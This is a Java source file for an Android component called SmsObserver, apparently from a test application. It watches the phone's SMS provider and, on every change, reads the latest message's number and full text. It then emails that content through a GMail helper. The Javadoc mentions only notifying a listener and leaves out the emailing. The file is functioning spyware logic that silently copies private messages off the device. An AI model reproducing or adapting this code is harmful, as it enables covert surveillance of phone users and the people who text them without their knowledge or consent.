package com.digitstory.testapplication.Services;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.format.DateFormat;
import android.util.Log;

import com.digitstory.testapplication.Utils.Config;
import com.digitstory.testapplication.Utils.Event;
import com.digitstory.testapplication.Utils.GMail;

import java.util.Calendar;
import java.util.Date;


/**
 * ContentObserver created to handle the sms content provider changes. This entity will be called each time the
 * system changes the sms content provider state.
 * <p/>
 * SmsObserver will analyze the sms inbox and sent content providers to get the sms information and will notify
 * SmsListener.
 * <p/>
 * The content observer will be called each time the sms content provider be updated. This means that all
 * the sms state changes will be notified. For example, when the sms state change from SENDING to SENT state.
 *
 */
class SmsObserver extends ContentObserver {



    private final Uri SMS_URI = Uri.parse("content://sms/");
    private final ContentResolver contentResolver;
    private final SmsCursorParser smsCursorParser;
    private final Context context;


    SmsObserver(ContentResolver contentResolver, Handler handler, SmsCursorParser smsCursorParser, Context context) {
        super(handler);
        this.contentResolver = contentResolver;
        this.smsCursorParser = smsCursorParser;
        this.context = context;
        Log.d(Config.TAG, "SmsObserver.constructor");
    }


    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Cursor cursor = null;
        try {
            cursor = contentResolver.query(SMS_URI, null, null, null, null);
            Log.d(Config.TAG, "SmsObserver.onChange().cursor = " + cursor);
            if (cursor != null && cursor.moveToFirst()) {
                processSms(cursor);
            }
        } finally {
            close(cursor);
        }
    }

    private void processSms(Cursor cursor) {
        Cursor smsCursor = null;
        try {
            String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
            smsCursor = getSmsDetailsCursor(protocol);
            smsCursor.moveToFirst();
            String add = smsCursor.getString(cursor.getColumnIndex("address"));
            String date = smsCursor.getString(cursor.getColumnIndex("date"));
            String date1 = DateFormat.format("yyyyMMdd,HH:mm:ss", new Date(Long.parseLong(date))).toString();
            String msg = smsCursor.getString(cursor.getColumnIndex("body"));
            int type = Integer.valueOf(cursor.getString(smsCursor.getColumnIndex("type")));
            Log.d(Config.TAG, "SmsObserver.onChange().processSms = " + msg);
            boolean boolean1 = smsCursorParser.parse(cursor);
            Log.d(Config.TAG, "SmsObserver.boolean1=" + boolean1 + "type=" + type);
            String smsContent = null;
            String event = Event.SMS_OTHERS;
           // if (boolean1) {

                if (type == 1) {
                    smsContent = "Received from " + add + ". Content is " + msg + "." ;
                    event = Event.SMS_RECEIVED;
                } else if (type == 2 || type == 4){
                    smsContent = "Sent to " + add + ". Content is " + msg + "." ;
                    event = Event.SMS_SENT;

                } else {
                    smsContent = "Related to " + add + ". Content is " + msg + "." ;
                    event = Event.SMS_OTHERS;
                }
                Log.d(Config.TAG, "SmsObserver:: content is " + smsContent + ". Date is " + date1);

               
          //  }
            sendEmail(add, smsContent == null ? msg : smsContent, event, this.context);
        } finally {
            close(smsCursor);
        }
    }

    public void sendEmail(String contactNumber, String msg, String event, Context ctx) {
        try {
            GMail gmail = new GMail(null, null, null, contactNumber, event + ":" + msg);
            RunAsyncTask raTask = new RunAsyncTask(gmail, ctx);
            raTask.execute("SmsObserver");
        } catch (Exception e) {
            Log.e(Config.TAG, e.getMessage(), e);
        }
    }


    private Cursor getSmsDetailsCursor(String protocol) {
        Cursor smsCursor;
        if (protocol == null) {
            //SMS Sent
            smsCursor = getSmsDetailsCursor(Uri.parse("content://sms/sent"));
        } else {
            //SMSReceived
            smsCursor = getSmsDetailsCursor(Uri.parse("content://sms/inbox"));
        }
        return smsCursor;
    }

    private Cursor getSmsDetailsCursor(Uri smsUri) {
        return smsUri != null ? this.contentResolver.query(smsUri, null, null, null, "date DESC") : null;
    }

    private void close(Cursor cursor) {
        if (cursor != null) {
            cursor.close();
        }
    }
}